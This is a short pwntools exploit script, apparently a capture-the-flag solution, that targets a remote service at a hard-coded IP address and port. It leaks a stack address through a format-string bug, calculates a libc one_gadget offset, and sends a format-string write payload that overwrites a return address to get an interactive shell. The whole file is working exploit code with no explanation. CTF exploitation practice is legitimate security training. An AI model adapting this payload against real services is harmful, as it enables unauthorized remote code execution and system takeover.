from pwn import *
#context.terminal = ['tmux', 'splitw', '-h']

p = remote('34.42.147.172', 4003)
#p = process('./chall')
l = ELF('./libc.so.6')
p.recvuntil(b'(gift/flag)')
p.send(b'%p%p%p%p%')
eip = int(p.recvuntil(b'r')[1:-1], 16) - (0x7fffffffc6b8 - 0x7fffffffc668)
print(hex(eip))
ref = 0x00007ffff7dd51ca - 0x7ffff7dab000
og = 0xef4ce
print(hex(ref))
payload = b'%11$n%12$n%13$n'
payload += b'%*25$c' + b'%' + str(og - ref).encode() + b'c' + b'%14$n'
payload += b'a' * 6
print(hex(len(payload)))
payload += p64(eip - 0x2c) + p64(eip - 0x30) + p64(eip - 0x28) + p64(eip)
p.sendafter(b"press ENTER to continue....", b'\n')
#gdb.attach(p)
p.recvuntil(b'Input :')
p.send(payload)
p.interactive()
